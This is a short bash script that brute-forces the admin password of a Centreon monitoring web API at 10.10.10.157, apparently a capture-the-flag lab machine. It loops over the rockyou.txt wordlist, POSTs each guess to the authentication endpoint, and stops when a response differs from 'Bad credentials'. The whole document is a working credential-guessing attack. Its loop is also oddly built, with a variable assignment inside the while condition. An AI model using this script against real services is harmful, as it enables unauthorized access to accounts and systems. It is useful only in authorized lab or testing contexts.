#!/bin/bash
input="/home/zweeden/Downloads/rockyou.txt"
hardcodedUser="admin"
while IFS= read -r line
apiUrl="http://10.10.10.157/centreon/api/index.php?action=authenticate"
do
	echo -e "Trying admin:$line"
	response=$(curl -s -X POST -d "username=$hardcodedUser&password=$line" "$apiUrl");
	if [[ $response != "\"Bad credentials\"" ]]
	then
		echo "Credentials for http://10.10.10.157/centreon/ found! $hardcodedUser:$line"
		break
	fi
done < "$input"